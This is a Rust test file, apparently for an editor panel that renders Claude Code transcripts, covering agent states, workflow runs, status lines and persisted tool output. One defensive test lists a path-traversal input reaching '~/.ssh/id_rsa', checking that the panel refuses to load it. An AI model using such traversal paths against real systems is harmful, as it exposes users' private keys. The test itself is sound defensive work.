            "the journal recorded this agent's result, which is the agent having returned"
        );

        let mut working = subagent("a1", Some("wf_b529a29d-562"), None);
        working.workflow_agent_finished = Some(false);
        assert_eq!(
            state_of(&working, &conversation),
            AgentState::Running,
            "the journal has no result for this agent, so it has not returned"
        );
    }

    /// The sidecar this scan lists an agent from is written when the agent is spawned,
    /// before the run's journal records it starting, and a run that has only just
    /// launched may have written no journal at all. Both gaps are the beginning of an
    /// agent's work, and calling either one of them the end draws a working run as done.
    #[test]
    fn a_workflow_agent_no_journal_accounts_for_is_taken_to_be_working() {
        let call = tool_use_line("m2", "toolu_09", "Workflow", serde_json::json!({}));
        let opening = user_message_line("m1", "go");
        let conversation: [&str; 2] = [&opening, &call];

        let unaccounted = subagent("a1", Some("wf_b529a29d-562"), None);
        assert_eq!(
            unaccounted.workflow_agent_finished, None,
            "the scan found no journal to account for this agent"
        );
        assert_eq!(state_of(&unaccounted, &conversation), AgentState::Running);
    }

    /// `Workflow` runs in the background and its call is answered the moment the run
    /// starts, so the `Run ID:` the answer carries announces a run that has only just
    /// begun. Reading that announcement as the run being over draws every agent of a
    /// running workflow as finished for as long as it runs.
    #[test]
    fn a_workflow_run_that_has_only_been_launched_is_still_running() {
        let summary = subagent("a1", Some("wf_b25f31ee-cab"), None);
        let call = tool_use_line("m2", "toolu_09", "Workflow", serde_json::json!({}));
        // Verbatim from a `Workflow` call that was still running when it was captured.
        let launch = tool_result_line_with_content(
            "m3",
            "toolu_09",
            "Workflow launched in background. Task ID: w2gew6q96\n\
             Summary: write the copy for the fifteen pair pages\n\
             Transcript dir: /home/coder/.claude/projects/-slug/session/subagents/workflows/wf_b25f31ee-cab\n\
             Run ID: wf_b25f31ee-cab\n\
             \n\
             You will be notified when it completes. Use /workflows to watch live progress.",
        );

        assert_eq!(
            state_of(&summary, &[&user_message_line("m1", "go"), &call, &launch]),
            AgentState::Running,
            "the run id is announced when the run starts, so the announcement is not the run ending"
        );
    }

    /// Captured from a session that was compacted after the question it was asking had
    /// been answered: the call and its result are still in the file, but compaction cut
    /// the chain the model reads, so they are not on the active path any more.
    ///
    /// The file recording a question being asked is never deleted, so reading the active
    /// path left the question on screen for the rest of the session — and while one was
    /// drawn the input section held itself open, so it could not be put away either.
    #[test]
    fn a_call_answered_before_a_compaction_is_still_answered() {
        let lines = [
            r#"{"type":"assistant","uuid":"a","message":{"content":[
                {"type":"tool_use","id":"toolu_asked","name":"AskUserQuestion","input":{}}]}}"#,
            r#"{"type":"user","uuid":"b","parentUuid":"a","message":{"content":[
                {"type":"tool_result","tool_use_id":"toolu_asked","content":"Alpha"}]}}"#,
            r#"{"type":"system","subtype":"compact_boundary","uuid":"c","logicalParentUuid":"b",
                "compactMetadata":{"trigger":"manual","preTokens":792090,"postTokens":16995}}"#,
            r#"{"type":"user","uuid":"d","parentUuid":"c","isCompactSummary":true,
                "message":{"content":"This session is being continued"}}"#,
        ];
        let mut transcript = crate::Transcript::new();
        transcript.absorb(lines.iter().map(|line| record(line)));

        assert!(
            !transcript
                .active_path()
                .iter()
                .any(|record| tool_result_ids(record).contains(&"toolu_asked")),
            "the fixture is only a fixture if compaction really did take the result off              the active path"
        );
        assert!(
            call_is_answered(&transcript, "toolu_asked"),
            "the call was answered before the compaction, and compaction does not un-answer              it"
        );
    }

    /// A `Task` agent's call is answered in its own session's conversation, and the list
    /// draws every session's agents while following one session's. For all the others the
    /// scan's own reading of their conversation is the only answer there is.
    #[test]
    fn a_task_agent_of_an_unread_session_is_finished_when_the_scan_says_so() {
        let mut agent = subagent("a0", None, Some("toolu_01"));
        agent.task_agent_finished = Some(true);

        assert_eq!(
            agent_state(&agent, &[]),
            AgentState::Finished,
            "no conversation is held for this session, so the scan's answer is the answer"
        );

        let mut still_working = subagent("a1", None, Some("toolu_02"));
        still_working.task_agent_finished = Some(false);
        assert_eq!(agent_state(&still_working, &[]), AgentState::Running);
    }

    /// The row of an agent the scan reports as returned comes off the list of a session
    /// nobody is reading, which is where the agents of a finished session pile up.
    #[test]
    fn a_finished_task_agent_of_an_unread_session_leaves_the_list() {
        let mut agent = subagent("a0", None, Some("toolu_01"));
        agent.meta.description = Some("印字然後等10分鐘".to_string());
        agent.task_agent_finished = Some(true);

        assert_eq!(
            session_agent_rows(&[agent], &[], &[], &READING_NOTHING),
            Vec::new()
        );
    }

    fn card(state: AgentState) -> AgentCardRow {
        AgentCardRow {
            label: SharedString::from("copy:batch-a"),
            state,
            offered: state == AgentState::Running,
            phase: None,
            target: TranscriptTarget::Main,
        }
    }

    #[test]
    fn successful_uninstall_reports_the_manual_mcp_cleanup_command() {
        let note = uninstall_hooks_note(Ok(()));
        assert!(note.contains("Hooks uninstalled"));
        assert!(note.contains("claude mcp remove zed-claude"));
    }

    /// The status line under the input names channel liveness, not heartbeat age: clocks
    /// disagree, and an age that contradicts "connected" is worse than no age.
    #[test]
    fn a_live_channel_draws_no_age_it_cannot_date() {
        let now_ms = 1_700_000_000_000;
        let line = format_status_line(&Turn::Idle, Some("default"), true, now_ms);
        assert_eq!(
            line, "● idle · mode: default · channel: connected",
            "got {line:?}"
        );
        let line = format_status_line(&Turn::Idle, Some("default"), false, now_ms);
        assert_eq!(
            line, "● idle · mode: default · channel: not loaded — Setup",
            "got {line:?}"
        );
        let line = format_status_line(
            &Turn::Running {
                since_ms: now_ms - 84_000,
            },
            Some("auto"),
            true,
            now_ms,
        );
        assert_eq!(
            line, "● running 1:24 · mode: auto · channel: connected",
            "got {line:?}"
        );
    }

    /// The line above a run's cards is the part a reader sees without opening anything,
    /// so it has to count what is working rather than what was spawned.
    #[test]
    fn the_line_above_a_runs_cards_counts_what_is_still_working() {
        assert_eq!(
            workflow_run_note(&[card(AgentState::Running), card(AgentState::Finished)]).as_ref(),
            "2 agents · 1 running"
        );
        assert_eq!(
            workflow_run_note(&[card(AgentState::Running)]).as_ref(),
            "1 agent · 1 running",
            "one agent is an agent, not agents"
        );
        assert_eq!(
            workflow_run_note(&[card(AgentState::Finished), card(AgentState::Finished)]).as_ref(),
            "2 agents · none running",
            "a run between phases has spawned nothing new yet, and `0 running` reads as a \
             claim that the run is over"
        );
    }

    /// Neither id, so nothing in the conversation pairs with this agent at all. Drawing
    /// it as running would be a guess presented as a fact, and a chip that pulses forever
    /// is worse than one that does not pulse.
    #[test]
    fn an_agent_with_neither_id_is_not_claimed_to_be_running() {
        let summary = subagent("a2", None, None);

        assert_eq!(
            state_of(&summary, &[&user_message_line("m1", "go")]),
            AgentState::Finished
        );
        assert_eq!(state_of(&summary, &[]), AgentState::Finished);
    }

    #[test]
    fn a_chip_is_labelled_with_what_the_agent_was_asked_to_do() {
        let mut described = subagent("a0000e203ec41bc73", None, None);
        described.meta.description = Some("round 2 review".to_string());
        assert_eq!(agent_chip_label(&described).as_ref(), "round 2 review");

        // Without a description there is nothing to say but which agent it is, and the
        // whole id is longer than the chip row can carry.
        let plain = subagent("a0000e203ec41bc73", None, None);
        assert_eq!(agent_chip_label(&plain).as_ref(), "general-purpose a0000e");
    }

    /// An id shorter than the six characters a chip shows must not be sliced through, and
    /// a description of nothing but spaces is not a label.
    #[test]
    fn a_chip_label_survives_a_short_id_and_a_blank_description() {
        let mut short = subagent("a0", None, None);
        assert_eq!(agent_chip_label(&short).as_ref(), "general-purpose a0");

        short.meta.description = Some("   ".to_string());
        assert_eq!(
            agent_chip_label(&short).as_ref(),
            "general-purpose a0",
            "a blank description leaves the chip with no label at all"
        );
    }

    #[test]
    fn a_chip_tooltip_names_only_the_fields_the_agent_records() {
        let bare = subagent("a0", None, None);
        assert_eq!(
            agent_chip_tooltip(&bare).as_ref(),
            "general-purpose\ndepth 1"
        );

        let mut full = subagent("a1", Some("wf_1"), None);
        full.meta.model = Some("opus".to_string());
        full.meta.spawn_depth = 2;
        full.meta.workflow_phase = Some("review".to_string());
        assert_eq!(
            agent_chip_tooltip(&full).as_ref(),
            "general-purpose\nopus\ndepth 2\nreview"
        );
    }

    /// The card under a call is only drawn for a call this panel can pair with an agent
    /// on disk; an empty card would say less than no card at all.
    #[test]
    fn only_agent_and_workflow_calls_are_offered_as_conversations_to_open() {
        let lines = [
            user_message_line("m1", "go"),
            tool_use_line(
                "m2",
                "toolu_01",
                "Agent",
                serde_json::json!({ "prompt": "look" }),
            ),
            tool_use_line(
                "m3",
                "toolu_02",
                "Bash",
                serde_json::json!({ "command": "ls" }),
            ),
            tool_use_line("m4", "toolu_03", "Workflow", serde_json::json!({})),
        ];
        let records: Vec<TranscriptRecord> = lines.iter().map(|line| record(line)).collect();
        let path: Vec<&TranscriptRecord> = records.iter().collect();
        let calls = agent_calls(&path);

        let mut keys: Vec<(String, String)> = calls
            .iter()
            .map(|(key, call)| (key.to_string(), call.tool_use_id.to_string()))
            .collect();
        keys.sort();
        assert_eq!(
            keys,
            vec![
                ("m2#0".to_string(), "toolu_01".to_string()),
                ("m4#0".to_string(), "toolu_03".to_string()),
            ],
            "only the two calls that spawn conversations may carry a card, keyed by the \
             entry the call is drawn as"
        );
    }

    #[test]
    fn a_call_is_paired_with_the_agent_it_spawned() {
        let by_tool_use_id = subagent("a0", None, Some("toolu_01"));
        let by_run_id = subagent("a1", Some("wf_b529a29d-562"), None);
        let subagents = vec![by_tool_use_id, by_run_id];

        let agent_call = AgentCall {
            tool_use_id: SharedString::from("toolu_01"),
            is_workflow: false,
        };
        assert_eq!(
            subagents_of_call(&agent_call, &subagents, &[])
                .iter()
                .map(|summary| summary.agent_id.as_str())
                .collect::<Vec<_>>(),
            vec!["a0"],
            "an `Agent` call is paired by the tool use id its agent records"
        );

        // A `Workflow` run's agents are paired through the run id its result announces.
        let workflow_call = AgentCall {
            tool_use_id: SharedString::from("toolu_09"),
            is_workflow: true,
        };
        let announcement = record(&tool_result_line_with_content(
            "m3",
            "toolu_09",
            "Run ID: wf_b529a29d-562",
        ));
        let path = vec![&announcement];
        assert_eq!(
            subagents_of_call(&workflow_call, &subagents, &path)
                .iter()
                .map(|summary| summary.agent_id.as_str())
                .collect::<Vec<_>>(),
            vec!["a1"]
        );
        assert!(
            subagents_of_call(&workflow_call, &subagents, &[]).is_empty(),
            "a run whose id the conversation has not announced yet pairs with nothing, \
             and an empty card is worse than none"
        );
    }

    #[test]
    fn output_no_longer_than_the_clamp_is_drawn_whole() {
        let output = "one\ntwo\nthree";
        assert!(!output_is_clamped(output, 12), "three lines fit");
        assert_eq!(clamped_output(output, 12), output);

        let at_the_limit = (0..12)
            .map(|line| format!("line {line}"))
            .collect::<Vec<_>>()
            .join("\n");
        assert!(
            !output_is_clamped(&at_the_limit, 12),
            "twelve lines is not more than twelve"
        );
        assert_eq!(clamped_output(&at_the_limit, 12), at_the_limit.as_str());
    }

    #[test]
    fn output_past_the_clamp_keeps_only_its_first_lines() {
        let output = (0..40)
            .map(|line| format!("line {line}"))
            .collect::<Vec<_>>()
            .join("\n");

        let clamped = clamped_output(&output, 12);
        assert_eq!(
            clamped.lines().count(),
            12,
            "the clamp keeps twelve of the forty lines, got {clamped:?}"
        );
        assert_eq!(
            output_is_clamped(&output, 12),
            output.lines().count() > 12,
            "forty lines is past a clamp of twelve"
        );
        assert_eq!(clamped.lines().next(), Some("line 0"));
        assert_eq!(clamped.lines().last(), Some("line 11"));
    }

    #[test]
    fn fences_grow_past_backticks_in_the_content() {
        let fenced = fenced_code("a ``` b", "");
        assert!(fenced.starts_with("````\n"));
        assert!(fenced.ends_with("\n````"));
    }

    #[test]
    fn base64_decodes_the_standard_and_url_safe_alphabets() {
        assert_eq!(decode_base64("aGVsbG8="), Some(b"hello".to_vec()));
        assert_eq!(decode_base64("aGVs\nbG8="), Some(b"hello".to_vec()));
        assert_eq!(decode_base64("-_8="), Some(vec![0xfb, 0xff]));
        assert_eq!(decode_base64("not base64!"), None);
    }

    #[test]
    fn ansi_stripping_handles_osc_and_bare_escapes() {
        assert_eq!(
            strip_ansi_escapes("\u{1b}]0;title\u{7}body"),
            "body".to_string()
        );
        assert_eq!(strip_ansi_escapes("\u{1b}Mtext"), "text".to_string());
        assert_eq!(
            strip_ansi_escapes("keep\ttabs\nand newlines"),
            "keep\ttabs\nand newlines"
        );
    }

    #[test]
    fn an_image_block_that_cannot_be_decoded_does_not_dump_its_payload() {
        let long_payload = "A".repeat(4096);
        let line = format!(
            r#"{{"type":"assistant","uuid":"a","message":{{"content":[{{"type":"image","source":{{"type":"base64","media_type":"image/not-a-format","data":"{long_payload}"}}}}]}}}}"#
        );
        let entries = entries_of(&[&line]);

        let EntryKind::Unknown { label, raw } = &entries[0].kind else {
            panic!("expected the undecodable image to fall back to raw JSON");
        };
        assert_eq!(label.as_ref(), "image");
        assert!(raw.contains("<4096 base64 characters>"));
        assert!(!raw.contains(&long_payload));
    }

    /// Builds the record shape 85 of the 86 persisted outputs have in practice: the
    /// structured `toolUseResult` carries stdout truncated to thirty kilobytes with no
    /// marker anywhere in it, plus the path and byte count of the full output, while the
    /// placeholder text sits in the content block beside it.
    fn structured_persisted_result(output_path: &Path) -> String {
        let output_path = output_path.to_string_lossy().into_owned();
        let placeholder = format!(
            "<persisted-output>\nOutput too large (80.6KB). Full output saved to: {output_path}\n\nPreview (first 2KB):\nthe first two kilobytes"
        );
        serde_json::json!({
            "type": "user",
            "uuid": "b",
            "toolUseResult": {
                "stdout": "line one\nline two",
                "stderr": "",
                "interrupted": false,
                "isImage": false,
                "noOutputExpected": false,
                "persistedOutputPath": output_path,
                "persistedOutputSize": 82585,
            },
            "message": {
                "content": [
                    { "type": "tool_result", "tool_use_id": "t1", "content": placeholder },
                ],
            },
        })
        .to_string()
    }

    const TOOL_USE_LINE: &str = r#"{"type":"assistant","uuid":"a","message":{"content":[{"type":"tool_use","id":"t1","name":"Bash","input":{"command":"ls"}}]}}"#;

    fn tool_result_body_with_home(json: &str, home_directory: Option<&Path>) -> ToolResultBody {
        let entries = entries_of_with_home(&[TOOL_USE_LINE, json], home_directory);
        match entries.get(1).map(|entry| &entry.kind) {
            Some(EntryKind::ToolResult { body, .. }) => body.clone(),
            other => panic!(
                "expected a tool result, got {:?}",
                other.map(|kind| matches!(kind, EntryKind::ToolResult { .. }))
            ),
        }
    }

    fn tool_result_body(json: &str) -> ToolResultBody {
        tool_result_body_with_home(json, Some(paths::home_dir()))
    }

    /// The shape a `SendUserFile` delivery is recorded in: the tool result's own content
    /// says only how many files were delivered, and `toolUseResult` names them.
    fn send_user_file_line(attachments: Value, caption: &str) -> String {
        serde_json::json!({
            "type": "user",
            "uuid": "b",
            "message": { "content": [ {
                "type": "tool_result",
                "tool_use_id": "t1",
                "content": "1 file delivered to user.",
            } ] },
            "toolUseResult": {
                "caption": caption,
                "display": "attach",
                "attachments": attachments,
            },
        })
        .to_string()
    }

    fn sent_files_of(line: &str) -> (Option<SharedString>, Vec<SentFile>) {
        let entries = entries_of(&[TOOL_USE_LINE, line]);
        match entries.get(1).map(|entry| &entry.kind) {
            Some(EntryKind::SentFiles { caption, files, .. }) => (caption.clone(), files.clone()),
            _ => panic!("expected the delivery to be shown as the files it delivered"),
        }
    }

    #[test]
    fn a_delivered_image_is_shown_as_the_image_rather_than_as_its_count() {
        let (caption, files) = sent_files_of(&send_user_file_line(
            serde_json::json!([{
                "path": "/home/coder/project/renders/poster.png",
                "size": 1_049_002,
                "isImage": true,
                "media_type": "image/png",
                "pathValidated": true,
            }]),
            "the poster, 1080p",
        ));

        assert_eq!(caption.as_deref(), Some("the poster, 1080p"));
        assert_eq!(files.len(), 1);
        assert_eq!(files[0].name.as_ref(), "poster.png");
        assert_eq!(
            files[0].path,
            PathBuf::from("/home/coder/project/renders/poster.png")
        );
        assert_eq!(files[0].size, Some(1_049_002));
        assert!(files[0].is_image, "a delivery that says `isImage` means it");
        assert_eq!(
            sent_image_format(&files[0]),
            Some(ImageFormat::Png),
            "the media type the delivery recorded is what the image is decoded as"
        );
    }

    #[test]
    fn a_delivered_video_is_named_rather_than_decoded() {
        let (_, files) = sent_files_of(&send_user_file_line(
            serde_json::json!([{
                "path": "/home/coder/project/out/preview-720p.mp4",
                "size": 11_242_847,
                "isImage": false,
                "media_type": "video/mp4",
                "pathValidated": true,
            }]),
            "720p preview",
        ));

        assert_eq!(files.len(), 1);
        assert!(files[0].is_video());
        assert!(!files[0].is_image);
        assert_eq!(
            sent_image_format(&files[0]),
            None,
            "there is no element that draws a video, so nothing is fetched for one"
        );
    }

    #[test]
    fn a_delivery_that_recorded_no_media_type_is_read_from_its_extension() {
        let (caption, files) = sent_files_of(&send_user_file_line(
            serde_json::json!([
                { "path": "/home/coder/project/shot.JPG", "size": 2048 },
                { "path": "/home/coder/project/packaging/uninstall.sh", "size": 7183 },
            ]),
            "   ",
        ));

        assert_eq!(
            caption, None,
            "a caption of nothing but spaces is no caption at all"
        );
        assert_eq!(files.len(), 2);
        assert_eq!(
            sent_image_format(&files[0]),
            Some(ImageFormat::Jpeg),
            "an extension in any case names the same format"
        );
        assert_eq!(
            sent_image_format(&files[1]),
            None,
            "a file that is not an image is not decoded as one"
        );
    }

    #[test]
    fn a_result_that_delivered_no_files_is_still_a_tool_result() {
        let no_attachments = serde_json::json!({
            "type": "user",
            "uuid": "b",
            "message": { "content": [ {
                "type": "tool_result",
                "tool_use_id": "t1",
                "content": "nothing was delivered",
            } ] },
            "toolUseResult": { "caption": "none", "display": "attach", "attachments": [] },
        })
        .to_string();

        assert_eq!(
            tool_result_body(&no_attachments),
            ToolResultBody::Inline(SharedString::from("nothing was delivered")),
            "an empty delivery leaves the result it answered showing its own text"
        );
    }

    #[test]
    fn structured_persisted_fields_inline_stdout_and_offer_the_full_output() {
        let output_path = paths::home_dir()
            .join(".claude/projects/-Users-user-zed/4e2e3600/tool-results/b7vd9w357.txt");
        let body = tool_result_body(&structured_persisted_result(&output_path));

        let ToolResultBody::Persisted(persisted) = &body else {
            panic!(
                "a result with persistedOutputPath must offer to load the full output, got {body:?}"
            );
        };
        assert_eq!(
            persisted.preview.as_ref(),
            "line one\nline two",
            "the inline body must be the structured stdout, not the placeholder's two-kilobyte preview"
        );
        assert_eq!(
            persisted.size.as_ref(),
            "80.6KB",
            "the size must come from persistedOutputSize (82585 bytes)"
        );
        assert_eq!(persisted.path, output_path);
    }

    #[test]
    fn a_persisted_path_outside_the_claude_projects_directory_is_not_offered() {
        let offers_the_full_output = |output_path: &Path| {
            matches!(
                tool_result_body(&structured_persisted_result(output_path)),
                ToolResultBody::Persisted(_)
            )
        };

        let outside: Vec<PathBuf> = vec![
            PathBuf::from("/tmp/tool-results/b7vd9w357.txt"),
            paths::home_dir().join(".ssh/id_rsa"),
            paths::home_dir().join(".claude/projects/../../.ssh/id_rsa"),
            paths::home_dir().join(".claude/todos/4e2e3600.json"),
            PathBuf::from("tool-results/b7vd9w357.txt"),
        ];
        let wrongly_offered: Vec<&PathBuf> = outside
            .iter()
            .filter(|output_path| offers_the_full_output(output_path))
            .collect();
        assert!(
            wrongly_offered.is_empty(),
            "a path outside <home>/.claude/projects must not be offered for loading, but these were: {wrongly_offered:#?}"
        );

        // What the check must not kill: every path Claude Code actually persists an
        // output to, tool results and hook output alike, in a session's own directory
        // and in a sub-agent's.
        let inside: Vec<PathBuf> = vec![
            paths::home_dir()
                .join(".claude/projects/-Users-user-zed/4e2e3600/tool-results/b7vd9w357.txt"),
            paths::home_dir().join(
                ".claude/projects/-Users-user-zed/4e2e3600/tool-results/hook-6ffbcaa5-stdout.txt",
            ),
            paths::home_dir().join(
                ".claude/projects/-Users-user-zed/4e2e3600/subagents/tool-results/b7vd9w357.txt",
            ),
        ];
        let wrongly_refused: Vec<&PathBuf> = inside
            .iter()
            .filter(|output_path| !offers_the_full_output(output_path))
            .collect();
        assert!(
            wrongly_refused.is_empty(),
            "a path Claude Code really persists output to must stay loadable, but these were refused: {wrongly_refused:#?}"
        );
    }

    /// A remote project's transcript names paths under the remote machine's home, which
    /// this machine's home says nothing about. The boundary has to be checked against the
    /// home the scan reported, and while it has reported none there is no offer to make.
    #[test]
    fn a_remote_persisted_path_is_offered_against_the_home_the_scan_reported() {
        let output_path = PathBuf::from("/home/deploy/.claude/projects/x/tool-results/a.txt");
        let result = structured_persisted_result(&output_path);
        let remote_home = PathBuf::from("/home/deploy");

        let body = tool_result_body_with_home(&result, Some(&remote_home));
        let ToolResultBody::Persisted(persisted) = &body else {
            panic!(
                "a path under the scanned machine's own .claude/projects must be offered for loading, got {body:?}"
            );
        };
        assert_eq!(persisted.path, output_path);

        let refused_homes: Vec<Option<PathBuf>> = vec![
            // No scan has reported a home yet, so there is nothing to check against.
            None,
            // A server too old to send one must not open the boundary either.
            Some(PathBuf::new()),
            // The bug this replaced: checking a remote path against the local home.
            Some(paths::home_dir().clone()),
        ];
        let wrongly_offered: Vec<&Option<PathBuf>> = refused_homes
            .iter()
            .filter(|home_directory| {
                matches!(
                    tool_result_body_with_home(&result, home_directory.as_deref()),
                    ToolResultBody::Persisted(_)
                )
            })
            .collect();
        assert!(
            wrongly_offered.is_empty(),
            "{output_path:?} must not be offered for loading against these home directories, but was: {wrongly_offered:#?}"
        );
    }

    /// One record for each artifact the cache has to keep across a rebuild: a decoded
    /// image, a pretty-printed unrecognized record, terminal output with its escapes
    /// stripped, and an attachment's rendered text.
    const EXPENSIVE_LINES: [&str; 4] = [
        r#"{"type":"user","uuid":"a","message":{"content":[{"type":"image","source":{"type":"base64","media_type":"image/png","data":"aGVsbG8="}}]}}"#,
        r#"{"type":"summary","uuid":"b","summary":"a record type with no display rule"}"#,
        r#"{"type":"system","subtype":"local_command","uuid":"c","content":"\u001b[1;31mred\u001b[0m plain"}"#,
        r#"{"type":"attachment","uuid":"d","attachment":{"type":"environment"},"rendered":[{"content":"cwd: /tmp"}]}"#,
    ];

    fn decoded_image(entries: &[Entry]) -> Arc<Image> {
        entries
            .iter()
            .find_map(|entry| match &entry.kind {
                EntryKind::Image { image, .. } => Some(image.clone()),
                _ => None,
            })
            .expect("the conversation contains one image")
    }

    fn local_command_texts(entries: &[Entry]) -> Vec<SharedString> {
        entries
            .iter()
            .filter_map(|entry| match &entry.kind {
                EntryKind::LocalCommand { text } => Some(text.clone()),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn expensive_artifacts_are_derived_once_and_reused_as_the_conversation_grows() {
        let records: Vec<TranscriptRecord> =
            EXPENSIVE_LINES.iter().map(|line| record(line)).collect();
        let one_more_turn = record(
            r#"{"type":"assistant","uuid":"e","message":{"content":[{"type":"text","text":"one more turn"}]}}"#,
        );

        let mut cache = EntryCache::default();
        let path: Vec<&TranscriptRecord> = records.iter().collect();
        let before = build_entries(&path, Some(paths::home_dir()), &mut cache);
        let derived_at_first = cache.derived;
        assert_eq!(
            derived_at_first,
            EXPENSIVE_LINES.len(),
            "the first build must derive one artifact per record"
        );

        // The next turn arrives, which is what the store notifies about up to four times
        // a second while a reply is streaming.
        let mut grown_path = path.clone();
        grown_path.push(&one_more_turn);
        let after = build_entries(&grown_path, Some(paths::home_dir()), &mut cache);

        let derived_again = cache.derived - derived_at_first;
        assert_eq!(
            derived_again, 1,
            "only the record that just arrived may be derived, but {derived_again} artifacts were derived again"
        );
        assert!(
            Arc::ptr_eq(&decoded_image(&before), &decoded_image(&after)),
            "the screenshot must be the same decoded bytes, not a second decoding of them"
        );
        assert_eq!(after.len(), before.len() + 1);
    }

    #[test]
    fn forgetting_an_overwritten_record_keeps_what_the_others_derived() {
        let overwritten =
            record(r#"{"type":"system","subtype":"local_command","uuid":"a","content":"first"}"#);
        let replacement =
            record(r#"{"type":"system","subtype":"local_command","uuid":"a","content":"second"}"#);
        // A uuid that merely starts with the overwritten one: dropping the artifacts of
        // `a` must not drop this record's as well.
        let namesake =
            record(r#"{"type":"system","subtype":"local_command","uuid":"ab","content":"kept"}"#);

        let mut cache = EntryCache::default();
        let entries = build_entries(
            &[&overwritten, &namesake],
            Some(paths::home_dir()),
            &mut cache,
        );
        assert_eq!(
            local_command_texts(&entries),
            vec![SharedString::from("first"), SharedString::from("kept")]
        );

        let derived_at_first = cache.derived;
        cache.forget_record("a");
        let entries = build_entries(
            &[&replacement, &namesake],
            Some(paths::home_dir()),
            &mut cache,
        );

        let derived_again = cache.derived - derived_at_first;
        assert_eq!(
            derived_again, 1,
            "only the replaced record may be derived again, but {derived_again} artifacts were"
        );
        assert_eq!(
            local_command_texts(&entries),
            vec![SharedString::from("second"), SharedString::from("kept")],
            "the replacement's own content must be shown, and its namesake's must be untouched"
        );
    }

    #[test]
    fn a_placeholder_only_result_is_shown_whether_or_not_its_path_can_be_read() {
        // The one persisted output in eighty-six that arrives with no structured fields
        // beside it: the placeholder text is the whole body, so it is shown either way,
        // and only the offer to read the file turns on the path.
        let placeholder_result = |output_path: &Path| {
            let output_path = output_path.to_string_lossy().into_owned();
            serde_json::json!({
                "type": "user",
                "uuid": "b",
                "message": { "content": [ {
                    "type": "tool_result",
                    "tool_use_id": "t1",
                    "content": format!(
                        "<persisted-output>\nOutput too large (36.2KB). Full output saved to: {output_path}\n\nPreview (first 2KB):\nfirst line"
                    ),
                } ] },
            })
            .to_string()
        };

        let outside = PathBuf::from("/tmp/tool-results/b9y333udj.txt");
        let ToolResultBody::Persisted(persisted) = tool_result_body(&placeholder_result(&outside))
        else {
            panic!("the placeholder must still be recognized without structured fields");
        };
        assert_eq!(persisted.preview.as_ref(), "first line");
        assert!(
            !persisted_output_is_loadable(&persisted.path, Some(paths::home_dir())),
            "{} is outside <home>/.claude/projects and must not be offered for loading",
            persisted.path.display()
        );

        let inside = paths::home_dir()
            .join(".claude/projects/-Users-user-zed/4e2e3600/tool-results/hook-6ffb-stdout.txt");
        let ToolResultBody::Persisted(persisted) = tool_result_body(&placeholder_result(&inside))
        else {
            panic!("the placeholder must still be recognized without structured fields");
        };
        assert!(
            persisted_output_is_loadable(&persisted.path, Some(paths::home_dir())),
            "{} is hook output Claude Code really writes and must stay loadable",
            persisted.path.display()
        );
    }

    #[test]
    fn a_compact_summary_is_not_labelled_as_something_the_user_typed() {
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","message":{"content":"my own prompt"}}"#,
            r#"{"type":"system","subtype":"compact_boundary","uuid":"b","logicalParentUuid":"a",
                "compactMetadata":{"trigger":"manual","preTokens":792090,"postTokens":16995}}"#,
            r#"{"type":"user","uuid":"c","isCompactSummary":true,
                "message":{"content":"This session is being continued from a previous conversation"}}"#,
        ]);

        let EntryKind::Message { role, .. } = &entries[0].kind else {
            panic!("expected the user's own prompt to render as a message");
        };
        assert_eq!(
            role.label().as_ref(),
            "You",
            "an ordinary user message must keep its own label"
        );

        let EntryKind::Message { role, .. } = &entries[2].kind else {
            panic!("expected the compact summary to still render as a message");
        };
        assert_eq!(
            role.label().as_ref(),
            "Summary",
            "a record with isCompactSummary: true was written by the compaction, not typed \
             by the user, and must not be labelled as if it were"
        );
    }

    #[test]
    fn a_local_command_whose_content_is_not_text_is_kept_as_raw_json() {
        let entries = entries_of(&[r#"{"type":"system","subtype":"local_command","uuid":"a",
                "content":[{"type":"text","text":"ls -l"}]}"#]);

        match &entries[0].kind {
            EntryKind::Unknown { label, raw } => {
                assert_eq!(label.as_ref(), "system / local_command");
                assert!(
                    raw.contains("ls -l"),
                    "the record's payload must survive in the raw JSON, got {raw}"
                );
            }
            EntryKind::LocalCommand { text } => panic!(
                "a local_command whose content is not text must be degraded to raw JSON \
                 rather than dropped: got LocalCommand {{ text: {text:?} }}"
            ),
            _ => panic!("expected either a raw JSON entry or a local command"),
        }
    }

    #[test]
    fn an_attachment_that_names_a_persisted_output_offers_the_whole_file() {
        // Hook output: the marker sits in `attachment.content`, and 1,080 of the 1,128
        // such records in the real transcripts carry no `rendered` array, so the body
        // shown for them is pretty-printed JSON in which the marker's newlines are
        // escaped — the path has to come from the content string itself.
        // Distinct uuids because the cache these are read through is keyed by uuid: two
        // records sharing one are the same record, and `absorb` would keep only the last.
        let attachment_line = |uuid: &str, output_path: &Path| {
            serde_json::json!({
                "type": "attachment",
                "uuid": uuid,
                "attachment": {
                    "type": "hook_success",
                    "hookName": "UserPromptSubmit",
                    "content": format!(
                        "<persisted-output>\nOutput too large (15.8KB). Full output saved to: {}\n\nPreview (first 2KB):\nfirst line of the preview",
                        output_path.display()
                    ),
                },
            })
            .to_string()
        };

        let inside = paths::home_dir()
            .join(".claude/projects/-Users-user/0f3b76a8/tool-results/hook-f975cad9-stdout.txt");
        let plain = r#"{"type":"attachment","uuid":"b","attachment":{"type":"environment"},
             "rendered":[{"content":"env text"}]}"#;
        let outside = PathBuf::from("/tmp/tool-results/hook-f975cad9-stdout.txt");
        let inside_line = attachment_line("a", &inside);
        let outside_line = attachment_line("c", &outside);

        let entries = entries_of(&[&inside_line, plain, &outside_line]);
        let EntryKind::Attachments { items } = &entries[0].kind else {
            panic!("expected the attachments section");
        };
        assert_eq!(items.len(), 3);

        let Some(persisted) = items[0].persisted.as_ref() else {
            panic!(
                "an attachment naming a persisted output must offer the whole file; got \
                 persisted: None for body {}",
                items[0].body
            )
        };
        assert_eq!(
            persisted.path, inside,
            "the path must be read from the marker text, not from the escaped JSON body"
        );
        assert_eq!(persisted.size.as_ref(), "15.8KB");
        assert_eq!(persisted.preview.as_ref(), "first line of the preview");

        assert!(
            items[1].persisted.is_none(),
            "an attachment with no marker must stay plain text, got {:?}",
            items[1].persisted
        );
        assert!(
            items[2].persisted.is_none(),
            "a marker naming a path outside <home>/.claude/projects must be shown as text \
             and never offered, got {:?}",
            items[2].persisted
        );
    }

    fn activity_of(json_lines: &[&str]) -> Activity {
        let records: Vec<TranscriptRecord> = json_lines.iter().map(|line| record(line)).collect();
        let path: Vec<&TranscriptRecord> = records.iter().collect();
        activity(&path)
    }

    fn thinking_line(uuid: &str) -> String {
